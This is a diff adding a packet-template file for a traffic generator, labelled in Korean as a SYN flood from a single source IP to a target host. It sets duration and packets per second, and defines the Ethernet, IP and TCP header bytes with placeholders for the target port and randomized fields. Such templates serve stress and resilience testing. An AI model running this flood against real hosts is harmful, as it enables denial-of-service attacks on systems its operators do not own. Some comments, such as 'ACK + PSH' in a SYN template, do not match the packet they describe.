@@ -1,0 +1,48 @@
+# 단일 소스IP에서 특정 호스트로 SYN 공격
+# [유지할초,초당패킷수(0은 최대)]
+
+<TCP>[@@DURATION,@@PPS]
+# RR 대신 바뀐부분
+############################################################
+# G H I J K L M N O P Q R S T U V
+# -------------------------------
+# 0 1 2 3 4 5 6 7 8 9 A B C D E F
+############################################################
+{
+# L2
+# Ethernet HEADER ----
+@@DMAC	# dest MAC
+@@SMAC	# src MAC
+08 00 # type IP
+
+# IP
+45 # Version : 4, Length 20
+00	# Differentiated Service Field : 0 ( DSCP 0, Default; ECN : 0)
+00 28 # total length
+GG GG # idenification
+40	# Flag : Don't Fragment
+00	# Fragment Offset
+KG	# Time To Live
+06	# Protocol : TCP
+00 00 #header checksum
+
+@@SIP # sip 
+@@DIP # dip
+
+#TCP
+SO GG #sport
+@@DPORT #dport   <-----------------------------TARGET---------->
+
+GG GG GG GG #seq no
+GG GG GG GG # ACK NO
+50 # header lenght
+
+@@TCPFLAG # TCP flag : ACK + PSH
+
+GG GG #window size
+00 00 #checksum
+GG GG # tcp options : set MSS 2 byte
+GG GG
+GG GG
+}
+
